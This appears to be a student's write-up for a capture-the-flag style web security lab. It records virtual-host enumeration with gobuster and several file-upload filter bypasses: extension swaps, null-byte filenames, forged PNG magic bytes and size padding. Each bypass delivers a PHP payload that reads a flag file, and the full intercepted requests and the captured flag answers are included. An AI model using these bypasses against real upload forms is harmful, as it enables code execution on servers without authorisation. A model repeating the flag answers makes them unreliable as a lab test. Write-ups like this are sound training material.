@@ -1,0 +1,198 @@
+Task0:
+
+└─$ gobuster vhost -u http://web0x05.hbtn -w /snap/seclists/737/Discovery/DNS/n0kovo_subdomains.txt -t 800 --append-domain
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://web0x05.hbtn
+[+] Method:          GET
+[+] Threads:         800
+[+] Wordlist:        /snap/seclists/737/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: xn--rvarspaket.web0x05.hbtn Status: 500 [Size: 265]
+Found: xn--mattenstrae6-u9a.web0x05.hbtn Status: 500 [Size: 265]
+Found: test-s3.web0x05.hbtn Status: 200 [Size: 478]
+Progress: 708344 / 3000001 (23.61%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 708482 / 3000001 (23.62%)
+===============================================================
+Finished
+===============================================================
+
+echo "test-s3.web0x05.hbtn" > 0-target.txt
+
+REMEMBER TO CHANGE YOUR NEW TARGET IN THE /ETC/HOSTS FILE FROM web0x005.hbtn to test-s3.web0x05.hbtn TO MAKE TASK 1 WORK
+
+Task1:
+
+└─$ Upload an image file and intercept the request using Burp Suite
+1. Select an image file (e.g., image.png) and upload it.
+2. Capture the request in Burp Suite.
+3. Modify the request:
+   - Change filename="image.png" to filename="image.php"
+   - Change Content-Type: image/png to Content-Type: application/x-php
+   - Replace the file content with:
+     ```php
+     <?php readfile('FLAG_1.txt'); ?>
+     ```
+
+Should look like this -- 
+
+POST /api/task1/ HTTP/1.1
+Host: test-s3.web0x05.hbtn
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://test-s3.web0x05.hbtn/
+Content-Type: multipart/form-data; boundary=----geckoformboundary3946bee4b48632af1812f187a22cf7df
+Content-Length: 246
+Origin: http://test-s3.web0x05.hbtn
+Connection: keep-alive
+Priority: u=0
+
+------geckoformboundary3946bee4b48632af1812f187a22cf7df
+Content-Disposition: form-data; name="file"; filename="image.php"
+Content-Type: application/x-php
+
+<?php readfile('FLAG_1.txt'); ?>
+
+------geckoformboundary3946bee4b48632af1812f187a22cf7df--
+
+4. Forward the modified request.
+5. Visit http://test-s3.web0x05.hbtn/static/upload/image.php to retrieve the flag.
+
+FLAG_1: 67ec7f99a7088097bbeab128752c661f
+
+echo "67ec7f99a7088097bbeab128752c661f" > 1-flag.txt
+
+Task2:
+
+target web0x05.hbtn/task2
+
+└─$ Upload an image file and intercept the request using Burp Suite
+1. Select an image file (e.g., image.png) and upload it.
+2. Capture the request in Burp Suite.
+3. Modify the request:
+   - Change filename="image.png" to filename="image2.php%00.png"
+   - Replace the file content with:
+     ```php
+     <?php readfile('FLAG_2.txt'); ?>
+     ```
+
+Should look like this -- 
+
+POST /api/task2/ HTTP/1.1
+Host: test-s3.web0x05.hbtn
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://test-s3.web0x05.hbtn/task2
+Content-Type: multipart/form-data; boundary=----geckoformboundaryddb456496e2d5747987aca02a37ce1f8
+Content-Length: 254
+Origin: http://test-s3.web0x05.hbtn
+Connection: keep-alive
+Priority: u=0
+
+------geckoformboundaryddb456496e2d5747987aca02a37ce1f8
+Content-Disposition: form-data; name="file"; filename="image2.php%00.png"
+Content-Type: image/png
+
+<?php readfile('FLAG_2.txt'); ?>
+
+------geckoformboundaryddb456496e2d5747987aca02a37ce1f8--
+
+4. Forward the modified request.
+5. Visit http://test-s3.web0x05.hbtn/static/upload/image2.php to retrieve the flag.
+
+FLAG_2: f9766ae58cbf3ec521affaac9f8b0709
+
+echo "f9766ae58cbf3ec521affaac9f8b0709" > 2-flag.txt
+
+
+Task3:
+
+target web0x05.hbtn/task3
+
+└─$ Modify the file’s magic number and upload it to bypass restrictions.
+1. Open a hex editor:
+   ```bash
+   hexedit image3.php.png
+   ```
+2. Modify the first 8 bytes to: PLEASE CHANGE IT MANUALLY
+   ```
+   89 50 4E 47 0D 0A 1A 0A
+   ```
+3. Save and exit.
+4. Upload the file and intercept the request in Burp Suite.
+5. Modify the request:
+   - Change filename="image3.php%00.png"
+   - Content-Type: image/png
+   - Keep the payload:
+     ```php
+     <?php readfile('FLAG_3.txt'); ?>
+     ```
+6. Forward the request.
+7. Visit http://test-s3.web0x05.hbtn/static/upload/image3.php to retrieve the flag.
+
+FLAG_3: 1f83ce82dfd9df5eb31c72145af6f011
+
+echo "1f83ce82dfd9df5eb31c72145af6f011" > 3-flag.txt
+
+Task4:
+
+Create a file named `upload_file_size.php`
+```php
+<?php
+// File content
+$content = "12345678<?php readfile('FLAG_4.txt') ?>";
+
+// Target size
+$targetSize = 85000;
+
+// Calculate the current content size
+$currentSize = strlen($content);
+
+// If the current size is less than the target size
+if ($currentSize < $targetSize) {
+    // Add padding bytes until the target size is reached
+    $fillSize = $targetSize - $currentSize;
+    $fillContent = str_repeat(' ', $fillSize); // Padding with spaces
+
+    // Write the padded content into the file
+    file_put_contents('image4.php%00.png', $content . $fillContent);
+} else {
+    // If the current size is already greater than or equal to the target size, do nothing
+}
+?>
+```
+
+run this command : php upload_file_size.php then:
+
+Modify the magic number:
+Run the following command:
+```bash
+hexeditor image4.php%00.png
+```
+
+Change the first 8 bytes to:
+```
+89 50 4E 47 0D 0A 1A 0A
+```
+
+Access the uploaded file:
+Visit:
+```
+http://test-s3.web0x05.hbtn/static/upload/image4.php
+```
+
+FLAG_4: a6ea7ce7b8cfcd960efc87cdb258d062
+
+echo "a6ea7ce7b8cfcd960efc87cdb258d062" > 4-flag.txt
